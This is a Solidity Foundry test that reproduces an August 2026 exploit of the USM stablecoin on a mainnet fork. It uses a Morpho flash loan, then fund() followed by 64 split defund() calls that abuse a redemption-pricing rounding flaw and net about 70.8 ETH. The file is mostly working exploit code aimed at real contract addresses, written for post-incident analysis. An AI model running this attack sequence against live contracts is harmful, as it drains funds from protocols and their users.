// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// USM (Minimalist USD stablecoin) — split-invariance flaw in the FUM redemption curve.
// ~70.8 ETH drained on Ethereum, Aug 2026.
//
// Attacker EOA:       0xb92b2E47680c89DA8f951B8963ef469f461a50Fc
// Attacker contract:  0x5a5e29ba89663a3558273354E990426F3cAc7de7
// Victim (USM):       0x2a7FFf44C19f39468064ab5e5c304De01D591675
// FUM token:          0x86729873e3b88DE2Ab85CA292D6d6D69D548eDF3
// Flash lender:       Morpho Blue 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb (WETH, 0 fee)
// Exploit tx:         0xfae5e751b8ce01457cbb6b529839f24a0cff50faaabcbd0fd02ca0cf559b050e (block 25716150)
//
// Root cause (verified against the on-chain trace of the exploit tx):
//   USM's defund() redeems FUM for ETH. The ETH paid for a redemption is priced off the
//   arithmetic mean of the CURRENT FUM sell price and the ESTIMATED FINAL FUM sell price after
//   the redemption, and each defund() also contracts internal state (adjShrinkFactor). That
//   averaging is not "split invariant": redeeming one large FUM amount in a single defund() pays
//   strictly LESS ETH than redeeming the same total FUM amount as many small equal slices across
//   consecutive defund() calls. The per-call state contraction plus integer rounding compound the
//   gap. The attacker minted a large FUM position with fund(), then redeemed it in 64 equal
//   slices instead of one, extracting more ETH than it paid in.
//
// This is a pure pricing/rounding logic bug, NOT price manipulation. The Chainlink/Uniswap TWAP
// oracle reads are identical before and during the attack (same latestPrice() return every call
// in the trace); nothing about the ETH/USD price is moved. The flash loan only supplies working
// capital to fund() a big FUM position — it is not used to move any price.
//
// Access check (confirmed from the trace): every fund() and defund() in the sequence is a plain
// permissionless public call made by the attacker contract inside the Morpho flash-loan callback.
// No signer, no admin role, no privileged path. fund(to, minFumOut) and defund(to, fumToBurn,
// minEthOut) are open to any caller.
//
// PoC strategy: fork one block before the exploit and replay the exact sequence against the real
// USM and FUM contracts (most faithful — the actual on-chain FUM pricing math runs, no
// reimplementation): Morpho flash-loan 11,579.978 WETH -> unwrap -> fund() the whole amount ->
// 64 defund() calls of ~971,629 FUM each (the same split the attacker used) -> rewrap and repay.
// Assert net ETH gain lands near the reported ~70.8 ETH.
//
// Run: forge test --contracts ./src/test/2026-08/USM_exp.sol -vvv

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IMorpho {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IUSM {
    function fund(address to, uint256 minFumOut) external payable returns (uint256);
    function defund(address to, uint256 fumToBurn, uint256 minEthOut) external returns (uint256);
    function fum() external view returns (address);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract USMExp is Test {
    IMorpho constant MORPHO = IMorpho(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUSM constant USM = IUSM(0x2a7FFf44C19f39468064ab5e5c304De01D591675);
    IERC20 constant FUM = IERC20(0x86729873e3b88DE2Ab85CA292D6d6D69D548eDF3);

    // Full WETH flash-loan taken in the real tx (0 fee on Morpho Blue).
    uint256 constant LOAN = 11_579_978_354_608_392_803_524;
    // Per-slice FUM burned per defund(); the attacker split the whole FUM position into 64 slices.
    uint256 constant SLICE = 971_629_672_368_796_643_705_078;
    uint256 constant SLICES = 64;

    function setUp() public {
        vm.createSelectFork("mainnet", 25716149); // one block before the exploit tx
    }

    function testExploit() public {
        vm.deal(address(this), 0); // start from zero so the delta is pure exploit profit
        emit log_named_decimal_uint("attacker ETH before", address(this).balance, 18);

        MORPHO.flashLoan(address(WETH), LOAN, "");

        uint256 profit = address(this).balance;
        emit log_named_decimal_uint("attacker ETH after (net profit)", profit, 18);

        // Split redemption nets more ETH than the flash-loan principal repaid: pure profit.
        assertGt(profit, 70 ether, "expected ~70.8 ETH profit");
        assertApproxEqAbs(profit, 70.8 ether, 1 ether, "profit should land near reported ~70.8 ETH");
    }

    // Morpho flash-loan callback.
    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == address(MORPHO), "only morpho");

        // Unwrap the borrowed WETH to native ETH.
        WETH.withdraw(assets);

        // Mint a large FUM position with a single fund() of the whole amount.
        USM.fund{value: assets}(address(this), 0);

        uint256 fumBal = FUM.balanceOf(address(this));

        // The bug: redeem the same total FUM in many small equal slices instead of one call.
        // 63 fixed slices, then whatever remains so the entire position is burned.
        for (uint256 i = 0; i < SLICES - 1; i++) {
            USM.defund(address(this), SLICE, 0);
        }
        USM.defund(address(this), FUM.balanceOf(address(this)), 0);

        // Rewrap exactly the borrowed principal and let Morpho pull it back (no fee).
        WETH.deposit{value: assets}();
        WETH.approve(address(MORPHO), assets);
    }

    receive() external payable {}
}
